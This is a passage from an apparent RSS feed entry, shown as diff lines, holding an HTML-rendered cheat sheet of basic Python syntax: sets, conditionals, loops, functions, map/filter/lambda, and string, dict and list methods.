+</code></pre></div><p>Array to Set conversion:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">set([<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">3</span>]) <span style="color:#75715e">#out {1,2,3}</span>
+</code></pre></div><p>Add to set:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">set<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>} <span style="color:#75715e">#out {1,2,3}</span>
+set<span style="color:#f92672">.</span>add(<span style="color:#ae81ff">5</span>)
+<span style="color:#66d9ef">print</span>(set) <span style="color:#75715e">#out {1,2,3,5}</span>
+</code></pre></div><h2 id="comparators">Comparators</h2>
+<p>Equal:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e">#False</span>
+</code></pre></div><p>And:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )<span style="color:#f92672">and</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#75715e">#False</span>
+</code></pre></div><p>Or:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">or</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#75715e">#True</span>
+</code></pre></div><p>If</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;True&#39;</span>)
+</code></pre></div><p>If,elsif,else:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Never&#39;</span>)
+<span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;True&#39;</span>)
+<span style="color:#66d9ef">else</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;else&#39;</span>)
+</code></pre></div><h2 id="loops">Loops</h2>
+<p>For:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">seq <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>]
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> seq:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Num: &#39;</span> <span style="color:#f92672">+</span> str(num))
+</code></pre></div><p>While:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;i is: {}&#39;</span><span style="color:#f92672">.</span>format(i))
+    i<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p>Range:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>)
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>):
+    <span style="color:#66d9ef">print</span>(x) <span style="color:#75715e"># 0-5</span>
+</code></pre></div><p>List, range:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list(range(<span style="color:#ae81ff">10</span>))
+</code></pre></div><p>List comprehension:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[num<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>)] <span style="color:#75715e">#out [0, 1, 4, 9, 16]</span>
+</code></pre></div><h2 id="functions">Functions</h2>
+<p>Function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_func</span>(param1):
+    <span style="color:#66d9ef">print</span>(param1)
+my_func(<span style="color:#e6db74">&#39;Hello world!&#39;</span>)
+my_func <span style="color:#75715e">#out &lt;function my_func at 0x7f81432c9b90&gt; #what is the object</span>
+</code></pre></div><p>Default function parameter value:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_func</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Default&#39;</span>):
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Hello &#39;</span> <span style="color:#f92672">+</span> name)
+my_func() <span style="color:#75715e">#out Hello Default</span>
+</code></pre></div><p>Function return:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">square</span>(num):
+    <span style="color:#66d9ef">return</span> num<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
+</code></pre></div><p>Documentation string:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">square</span>(num):
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">This is documentation
+</span><span style="color:#e6db74">Multiple lines
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">return</span> num<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
+</code></pre></div><h2 id="collection-methods">Collection methods</h2>
+<p>Map function:
+<strong>Apply function to each element of seq</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">times2</span>(var):
+    <span style="color:#66d9ef">return</span> var<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+
+list(map(times2, list(range(<span style="color:#ae81ff">4</span>)))) <span style="color:#75715e">#out [0, 2, 4, 6]</span>
+</code></pre></div><p>Lambda expressions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">times2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> var:var<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+
+list(map(times2, list(range(<span style="color:#ae81ff">4</span>)))) <span style="color:#75715e">#out [0, 2, 4, 6]</span>
+</code></pre></div><p>Pass lambda as param:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list(map(<span style="color:#66d9ef">lambda</span> num: num<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>, list(range(<span style="color:#ae81ff">4</span>)))) <span style="color:#75715e">#out [0, 3, 6, 9]</span>
+</code></pre></div><p>Filter:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list(filter(<span style="color:#66d9ef">lambda</span> num: num<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>, range(<span style="color:#ae81ff">4</span>))) <span style="color:#75715e">#out [0, 2]</span>
+</code></pre></div><p>String methods:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Some string value&#39;</span>
+s<span style="color:#f92672">.</span>lower() <span style="color:#75715e"># lowercase</span>
+s<span style="color:#f92672">.</span>upper() <span style="color:#75715e"># uppercase</span>
+s<span style="color:#f92672">.</span>split() <span style="color:#75715e"># split by whitespace</span>
+s<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;#pattern&#39;</span>) <span style="color:#75715e"># split by #pattern</span>
+</code></pre></div><p>Dictionary methods:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">d <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;k1&#39;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;k2&#39;</span>: <span style="color:#ae81ff">2</span>}
+d<span style="color:#f92672">.</span>keys() <span style="color:#75715e">#out dict_keys([&#39;k1&#39;, &#39;k2&#39;])</span>
+d<span style="color:#f92672">.</span>items() <span style="color:#75715e">#out dict_items([(&#39;k1&#39;, 1), (&#39;k2&#39;, 2)])</span>
+d<span style="color:#f92672">.</span>values() <span style="color:#75715e">#out dict_values([1, 2])</span>
+</code></pre></div><p>List methods:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>]
+list<span style="color:#f92672">.</span>pop() <span style="color:#75715e">#return and remove last element, out 4</span>
+list<span style="color:#f92672">.</span>pop(<span style="color:#ae81ff">0</span>) <span style="color:#75715e">#return and remove element of index 0, out 0</span>
+list<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;value&#34;</span>) <span style="color:#75715e">#out [1, 2, 3, &#39;value&#39;]</span>
+</code></pre></div><p><strong>In</strong> operator:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">in</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>] <span style="color:#75715e">#out False</span>
+<span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>] <span style="color:#75715e">#out True</span>
+</code></pre></div><p>Touple unpacking:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">x <span style="color:#f92672">=</span> [(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>),(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>),(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>)]
+<span style="color:#66d9ef">for</span> (a,b) <span style="color:#f92672">in</span> x:
+    <span style="color:#66d9ef">print</span>(b) <span style="color:#75715e">#out 2, 4, 6</span>
+</code></pre></div>]]></content></item></channel></rss>
